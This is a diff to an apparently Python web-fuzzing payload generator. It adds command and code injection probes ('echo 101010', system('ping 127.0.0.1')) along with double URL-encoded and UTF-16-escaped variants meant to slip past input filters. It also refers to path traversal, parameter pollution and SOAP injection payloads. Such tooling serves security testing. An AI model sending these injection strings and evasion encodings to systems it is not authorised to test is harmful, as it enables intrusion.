@@ -3,8 +3,13 @@ import urllib
 import random
 
 payload_type = None
+######################################
+dynamic_ex__page_inj_payload = [';echo 101010', 'echo 101010', 'response.write 101010', ':response.write 101010']
+dynamic_ex_delay_call_payload = ['''system('ping 127.0.0.1')]''', ''';system('ping 127.0.0.1')]''', ''':system('ping 127.0.0.1')]''']
+#######################################
 pathtraversalaux_linux = 'TxtAux/LinuxPathTraversal.txt'
 pathtraversalaux_windows = 'TxtAux/WindowsPathTraversal.txt'
+#########################################
 parameter_pollution_payload = '&rab=oof'
 ###################################
 soap_inj_foo = '</foo>'
@@ -28,6 +33,9 @@ backslashutf16 = '%u2216'
 andutf16 = '%u0026'
 equalutf16 = '%u003D'
 fullstoputf16 = '%u002E'
+semicolonutf16 = '%u003B'
+colonutf16 = '%u003A'
+apostropheutf16 = '%u0027'
 
 
 def setType(option):
@@ -43,6 +51,8 @@ def payloadslist(option):
         soap_injection_payload_gen()
     if option == 'pt':
         path_traversal_payload_gen()
+    if option == 'de':
+        dynamic_execution_gen()
     return paylist
 
 
@@ -53,6 +63,19 @@ def parameter_pollution_payload_gen():
     paylist.append(urllib.quote_plus(urllib.quote_plus(parameter_pollution_payload)))
     paylist.append(parameter_pollution_payload.replace('=', equalutf16).replace('&', andutf16))
 
+def dynamic_execution_gen():
+    global paylist, dynamic_ex__page_inj_payload, dynamic_ex_delay_call_payload, andutf16, equalutf16
+    paylist_first_test = []
+    paylist_second_test = []
+    for i in dynamic_ex__page_inj_payload:
+        paylist_first_test.append(urllib.quote_plus(i))
+        paylist_first_test.append(urllib.quote_plus(urllib.quote_plus(i)))
+        paylist_first_test.append(i.replace(';', semicolonutf16).replace(':', colonutf16).replace('.', dotutf16))
+    for i in dynamic_ex_delay_call_payload:
+        paylist_second_test.append(urllib.quote_plus(i))
+        paylist_second_test.append(urllib.quote_plus(urllib.quote_plus(i)))
+        paylist_second_test.append(i.replace(';', semicolonutf16).replace(':', colonutf16).replace('.', dotutf16).replace("'", apostropheutf16))
+    return [paylist_first_test, paylist_second_test]
 
 def soap_injection_payload_gen():
     global paylist, soap_inj_foo, soap_inj_foo_closed, soap_inj_comment, soap_inj_close_comment
